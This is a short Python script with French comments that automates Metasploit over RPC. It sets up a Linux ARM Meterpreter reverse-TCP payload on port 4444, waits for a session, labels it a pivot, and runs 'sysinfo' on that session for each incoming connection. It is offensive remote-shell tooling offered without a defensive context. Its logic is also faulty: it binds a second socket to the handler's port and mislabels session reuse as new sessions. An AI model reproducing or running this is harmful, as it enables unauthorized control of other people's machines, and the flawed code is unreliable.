import os
import time
import msfrpc
import socket

# Configuration Metasploit
msf_host = "localhost"
msf_port = 55553
msf_user = "msf"
msf_pass = "msf"

# Configuration de la session Meterpreter
meterpreter_host = "0.0.0.0"  # Listen on all interfaces
meterpreter_port = 4444

# Établir la connexion à Metasploit
client = msfrpc.Msfrpc({ 'uri': f"http://{msf_host}:{msf_port}", 'username': msf_user, 'password': msf_pass })

# Lancer la payload Meterpreter
payload = client.modules.use('payload', 'linux/armle/meterpreter/reverse_tcp')
payload['LHOST'] = meterpreter_host
payload['LPORT'] = meterpreter_port
payload.execute()

# Attendre que la session soit établie
while True:
    time.sleep(1)
    sessions = client.sessions.list
    for session in sessions:
        if session['info']['via_exploit'] == 'meterpreter/reverse_tcp':
            print(f"Session Meterpreter établie : {session['id']}")
            break
    else:
        continue
    break

# Pivoter avec la session Meterpreter
pivot_session = client.sessions.session(session['id'])

# Créer un socket pour écouter les connexions entrantes
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((meterpreter_host, meterpreter_port))
sock.listen(1)

print("Écoute des connexions entrantes...")

while True:
    conn, addr = sock.accept()
    print(f"Connexion établie avec {addr[0]}:{addr[1]}")

    # Établir une nouvelle session Meterpreter pour chaque connexion entrante
    new_session = client.sessions.session(pivot_session.id)
    new_session.write("sysinfo")
    print(new_session.read())

    # Fermer la connexion
    conn.close()
